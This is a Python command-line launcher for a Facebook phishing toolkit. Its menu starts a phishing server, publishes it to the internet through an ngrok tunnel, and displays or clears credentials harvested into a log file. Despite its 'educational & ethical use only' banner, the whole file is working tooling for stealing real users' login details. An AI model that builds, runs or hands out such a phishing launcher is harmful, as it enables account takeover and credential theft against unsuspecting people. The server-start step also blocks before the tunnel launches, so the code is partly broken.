import os
import subprocess
import time

def banner():
    print(r"""
  _____ _     _     _     _     _   
 |  ___| |__ (_)___| |__ (_)___| |_ 
 | |_  | '_ \| / __| '_ \| / __| __|
 |  _| | | | | \__ \ | | | \__ \ |_ 
 |_|   |_| |_|_|___/_| |_|_|___/\__|
                                   
     Facebook Phishing Toolkit CLI
           - by Gitesh 🔐
    """)
    print("🔒 For educational & ethical use only\n")

def start_server():
    print("[*] Starting phishing server on http://localhost:5000 ...")
    subprocess.run(["python3", "server.py"])
    time.sleep(2)

def start_ngrok():
    print("[*] Launching Ngrok tunnel...")
    ngrok = subprocess.Popen(["ngrok", "http", "5000"], stdout=subprocess.DEVNULL)
    time.sleep(3)

    try:
        # Get the public URL from ngrok's API
        import requests
        tunnel_info = requests.get("http://127.0.0.1:4040/api/tunnels").json()
        public_url = tunnel_info['tunnels'][0]['public_url']
        print(f"[+] Ngrok URL: {public_url}")
    except Exception as e:
        print("[-] Failed to fetch Ngrok URL. Is Ngrok running?")
    
    return ngrok

def view_logs():
    print("\n[*] Captured Credentials:\n")
    if os.path.exists("logs/creds.txt"):
        with open("logs/creds.txt", "r") as file:
            print(file.read())
    else:
        print("[-] No credentials logged yet.")

def clear_logs():
    if os.path.exists("logs/creds.txt"):
        open("logs/creds.txt", "w").close()
        print("[+] Logs cleared successfully.")
    else:
        print("[-] No logs to clear.")

def main():
    banner()
    ngrok_process = None

    while True:
        print("\n[ MENU ]")
        print("1. Launch Phishing Server (Local Only)")
        print("2. Launch Server with Ngrok (Public URL)")
        print("3. View Captured Credentials")
        print("4. Clear Logs")
        print("5. Exit")

        choice = input("Select option > ")

        if choice == '1':
            start_server()
        elif choice == '2':
            start_server()
            ngrok_process = start_ngrok()
        elif choice == '3':
            view_logs()
        elif choice == '4':
            clear_logs()
        elif choice == '5':
            print("[*] Exiting. Stay ethical 🛡️")
            if ngrok_process:
                ngrok_process.terminate()
            break
        else:
            print("Invalid input. Try again.")

if __name__ == "__main__":
    main()

